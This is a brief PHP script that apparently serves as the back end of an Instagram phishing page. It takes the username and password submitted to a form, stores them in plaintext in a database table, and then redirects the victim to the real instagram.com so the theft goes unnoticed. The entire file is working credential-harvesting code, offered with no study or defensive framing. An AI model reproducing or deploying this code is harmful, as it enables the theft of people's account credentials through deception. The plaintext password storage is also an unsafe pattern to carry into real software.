<?php
include('db_connection.php');

$connection = new Connection();
$database_connection = $connection->getConnection();
$table = "user";

$field_username = "username";
$field_password = "password";

//Get form data
$form_username = $_POST[$field_username];
$form_password = $_POST[$field_password];

//Insert data on database
$query_insert = "INSERT INTO $table($field_username, $field_password) VALUES(?, ?)";
$statement = $database_connection->prepare($query_insert);

$statement->bind_param("ss", $form_username, $form_password);

$statement->execute();
	
$statement->close();
$database_connection->close();

header("Location: https://www.instagram.com/");
exit();
?>
